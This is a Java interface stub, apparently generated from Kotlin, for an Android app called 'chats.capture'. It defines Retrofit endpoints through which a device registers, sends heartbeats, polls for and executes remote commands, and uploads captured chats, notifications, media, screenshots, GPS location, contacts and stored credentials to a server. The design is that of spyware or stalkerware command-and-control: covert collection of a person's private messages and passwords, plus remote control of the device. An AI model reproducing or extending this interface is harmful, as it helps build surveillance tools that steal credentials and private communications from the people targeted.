package com.chats.capture.network;

@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u0000\u0096\u0001\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\b\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0010 \n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0005\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0004\n\u0002\u0018\u0002\n\u0002\b\u0003\n\u0002\u0018\u0002\n\u0002\b\u0007\bf\u0018\u00002\u00020\u0001J\u001e\u0010\u0002\u001a\b\u0012\u0004\u0012\u00020\u00040\u00032\b\b\u0001\u0010\u0005\u001a\u00020\u0006H\u00a7@\u00a2\u0006\u0002\u0010\u0007J(\u0010\b\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0003\u0010\n\u001a\u00020\u000b2\b\b\u0003\u0010\f\u001a\u00020\u000bH\u00a7@\u00a2\u0006\u0002\u0010\rJ(\u0010\u000e\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0003\u0010\n\u001a\u00020\u000b2\b\b\u0003\u0010\f\u001a\u00020\u000bH\u00a7@\u00a2\u0006\u0002\u0010\rJ\u001e\u0010\u000f\u001a\b\u0012\u0004\u0012\u00020\u00100\u00032\b\b\u0001\u0010\u0011\u001a\u00020\u0012H\u00a7@\u00a2\u0006\u0002\u0010\u0013J\u001e\u0010\u0014\u001a\b\u0012\u0004\u0012\u00020\u00100\u00032\b\b\u0001\u0010\u0015\u001a\u00020\u0016H\u00a7@\u00a2\u0006\u0002\u0010\u0017J(\u0010\u0018\u001a\b\u0012\u0004\u0012\u00020\u00100\u00032\b\b\u0001\u0010\u0011\u001a\u00020\u00122\b\b\u0001\u0010\u0019\u001a\u00020\u001aH\u00a7@\u00a2\u0006\u0002\u0010\u001bJ(\u0010\u001c\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u0010\u001d\u001a\u00020\u00122\b\b\u0001\u0010\u001e\u001a\u00020\u001fH\u00a7@\u00a2\u0006\u0002\u0010 J\u001e\u0010!\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u0010\"\u001a\u00020#H\u00a7@\u00a2\u0006\u0002\u0010$J$\u0010%\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\u000e\b\u0001\u0010&\u001a\b\u0012\u0004\u0012\u00020#0\'H\u00a7@\u00a2\u0006\u0002\u0010(J\u001e\u0010)\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u0010*\u001a\u00020+H\u00a7@\u00a2\u0006\u0002\u0010,J$\u0010-\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\u000e\b\u0001\u0010.\u001a\b\u0012\u0004\u0012\u00020+0\'H\u00a7@\u00a2\u0006\u0002\u0010(J\u001e\u0010/\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u00100\u001a\u000201H\u00a7@\u00a2\u0006\u0002\u00102J$\u00103\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\u000e\b\u0001\u00104\u001a\b\u0012\u0004\u0012\u0002010\'H\u00a7@\u00a2\u0006\u0002\u0010(J(\u00105\u001a\b\u0012\u0004\u0012\u00020\u00100\u00032\b\b\u0001\u0010\u0011\u001a\u00020\u00122\b\b\u0001\u00106\u001a\u000207H\u00a7@\u00a2\u0006\u0002\u00108JF\u00109\u001a\b\u0012\u0004\u0012\u00020:0\u00032\b\b\u0001\u0010;\u001a\u00020<2\b\b\u0001\u0010=\u001a\u00020<2\b\b\u0001\u0010>\u001a\u00020<2\b\b\u0001\u0010?\u001a\u00020<2\b\b\u0001\u0010@\u001a\u00020AH\u00a7@\u00a2\u0006\u0002\u0010BJ\u001e\u0010C\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u0010D\u001a\u00020EH\u00a7@\u00a2\u0006\u0002\u0010FJ$\u0010G\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\u000e\b\u0001\u0010H\u001a\b\u0012\u0004\u0012\u00020E0\'H\u00a7@\u00a2\u0006\u0002\u0010(J(\u0010I\u001a\b\u0012\u0004\u0012\u00020\t0\u00032\b\b\u0001\u0010\u0011\u001a\u00020\u00122\b\b\u0001\u0010J\u001a\u00020AH\u00a7@\u00a2\u0006\u0002\u0010K\u00a8\u0006L"}, d2 = {"Lcom/chats/capture/network/ApiService;", "", "executeRemoteCommand", "Lretrofit2/Response;", "Lcom/chats/capture/network/RemoteCommandResponse;", "command", "Lcom/chats/capture/network/RemoteCommand;", "(Lcom/chats/capture/network/RemoteCommand;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getChats", "Lcom/chats/capture/network/ApiResponse;", "page", "", "limit", "(IILkotlin/coroutines/Continuation;)Ljava/lang/Object;", "getNotifications", "getPendingCommands", "Lokhttp3/ResponseBody;", "deviceId", "", "(Ljava/lang/String;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "registerDevice", "deviceInfo", "Lcom/chats/capture/network/DeviceRegistrationRequest;", "(Lcom/chats/capture/network/DeviceRegistrationRequest;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "sendHeartbeat", "heartbeat", "Lcom/chats/capture/network/HeartbeatRequest;", "(Ljava/lang/String;Lcom/chats/capture/network/HeartbeatRequest;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "updateCommandResult", "commandId", "result", "Lcom/chats/capture/network/CommandResultRequest;", "(Ljava/lang/String;Lcom/chats/capture/network/CommandResultRequest;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadChat", "chat", "Lcom/chats/capture/models/ChatData;", "(Lcom/chats/capture/models/ChatData;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadChatsBatch", "chats", "", "(Ljava/util/List;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadContact", "contact", "Lcom/chats/capture/models/Contact;", "(Lcom/chats/capture/models/Contact;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadContactsBatch", "contacts", "uploadCredential", "credential", "Lcom/chats/capture/models/Credential;", "(Lcom/chats/capture/models/Credential;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadCredentialsBatch", "credentials", "uploadLocation", "location", "Lcom/chats/capture/network/LocationData;", "(Ljava/lang/String;Lcom/chats/capture/network/LocationData;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadMedia", "Lcom/chats/capture/network/MediaUploadResponse;", "notificationId", "Lokhttp3/RequestBody;", "checksum", "mimeType", "appPackage", "file", "Lokhttp3/MultipartBody$Part;", "(Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/RequestBody;Lokhttp3/MultipartBody$Part;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadNotification", "notification", "Lcom/chats/capture/models/NotificationData;", "(Lcom/chats/capture/models/NotificationData;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "uploadNotificationsBatch", "notifications", "uploadScreenshot", "screenshot", "(Ljava/lang/String;Lokhttp3/MultipartBody$Part;Lkotlin/coroutines/Continuation;)Ljava/lang/Object;", "app_debug"})
public abstract interface ApiService {
    
    @retrofit2.http.POST(value = "api/devices/register")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object registerDevice(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.network.DeviceRegistrationRequest deviceInfo, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<okhttp3.ResponseBody>> $completion);
    
    @retrofit2.http.POST(value = "api/devices/{deviceId}/heartbeat")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object sendHeartbeat(@retrofit2.http.Path(value = "deviceId")
    @org.jetbrains.annotations.NotNull()
    java.lang.String deviceId, @retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.network.HeartbeatRequest heartbeat, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<okhttp3.ResponseBody>> $completion);
    
    @retrofit2.http.GET(value = "api/devices/{deviceId}/commands/pending")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getPendingCommands(@retrofit2.http.Path(value = "deviceId")
    @org.jetbrains.annotations.NotNull()
    java.lang.String deviceId, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<okhttp3.ResponseBody>> $completion);
    
    @retrofit2.http.PUT(value = "api/commands/{commandId}/result")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object updateCommandResult(@retrofit2.http.Path(value = "commandId")
    @org.jetbrains.annotations.NotNull()
    java.lang.String commandId, @retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.network.CommandResultRequest result, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/notifications")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadNotification(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.models.NotificationData notification, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/notifications/batch")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadNotificationsBatch(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.NotificationData> notifications, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/chats")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadChat(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.models.ChatData chat, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/chats/batch")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadChatsBatch(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.ChatData> chats, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.Multipart()
    @retrofit2.http.POST(value = "api/media/upload")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadMedia(@retrofit2.http.Part(value = "notificationId")
    @org.jetbrains.annotations.NotNull()
    okhttp3.RequestBody notificationId, @retrofit2.http.Part(value = "checksum")
    @org.jetbrains.annotations.NotNull()
    okhttp3.RequestBody checksum, @retrofit2.http.Part(value = "mimeType")
    @org.jetbrains.annotations.NotNull()
    okhttp3.RequestBody mimeType, @retrofit2.http.Part(value = "appPackage")
    @org.jetbrains.annotations.NotNull()
    okhttp3.RequestBody appPackage, @retrofit2.http.Part()
    @org.jetbrains.annotations.NotNull()
    okhttp3.MultipartBody.Part file, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.MediaUploadResponse>> $completion);
    
    @retrofit2.http.GET(value = "api/notifications")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getNotifications(@retrofit2.http.Query(value = "page")
    int page, @retrofit2.http.Query(value = "limit")
    int limit, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.GET(value = "api/chats")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object getChats(@retrofit2.http.Query(value = "page")
    int page, @retrofit2.http.Query(value = "limit")
    int limit, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/remote/command")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object executeRemoteCommand(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.network.RemoteCommand command, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.RemoteCommandResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/credentials")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadCredential(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.models.Credential credential, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/credentials/batch")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadCredentialsBatch(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.Credential> credentials, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.Multipart()
    @retrofit2.http.POST(value = "api/devices/{deviceId}/screenshots")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadScreenshot(@retrofit2.http.Path(value = "deviceId")
    @org.jetbrains.annotations.NotNull()
    java.lang.String deviceId, @retrofit2.http.Part()
    @org.jetbrains.annotations.NotNull()
    okhttp3.MultipartBody.Part screenshot, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/devices/{deviceId}/location")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadLocation(@retrofit2.http.Path(value = "deviceId")
    @org.jetbrains.annotations.NotNull()
    java.lang.String deviceId, @retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.network.LocationData location, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<okhttp3.ResponseBody>> $completion);
    
    @retrofit2.http.POST(value = "api/contacts")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadContact(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    com.chats.capture.models.Contact contact, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @retrofit2.http.POST(value = "api/contacts/batch")
    @org.jetbrains.annotations.Nullable()
    public abstract java.lang.Object uploadContactsBatch(@retrofit2.http.Body()
    @org.jetbrains.annotations.NotNull()
    java.util.List<com.chats.capture.models.Contact> contacts, @org.jetbrains.annotations.NotNull()
    kotlin.coroutines.Continuation<? super retrofit2.Response<com.chats.capture.network.ApiResponse>> $completion);
    
    @kotlin.Metadata(mv = {1, 9, 0}, k = 3, xi = 48)
    public static final class DefaultImpls {
    }
}